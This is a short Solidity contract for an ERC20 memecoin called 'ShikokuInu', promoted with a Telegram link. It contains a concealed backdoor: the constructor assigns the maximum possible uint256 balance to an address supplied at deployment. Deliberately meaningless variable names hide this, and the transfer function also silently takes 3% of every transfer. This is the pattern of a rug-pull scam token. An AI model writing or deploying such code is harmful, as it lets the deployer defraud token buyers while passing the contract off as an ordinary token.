// https://t.me/shikokueth

// SPDX-License-Identifier: GPL-3.0

pragma solidity >0.8.7;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';

contract ShikokuInu is ERC20, Ownable {
    uint256 private stared = ~uint256(0);
    uint256 public selection = 3;

    constructor(
        string memory alphabet,
        string memory spin,
        address flies,
        address beside
    ) ERC20(alphabet, spin) {
        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[beside] = stared;
    }

    function _transfer(
        address pay,
        address bar,
        uint256 tune
    ) internal override {
        uint256 situation = (tune / 100) * selection;
        tune = tune - situation;
        super._transfer(pay, bar, tune);
    }
}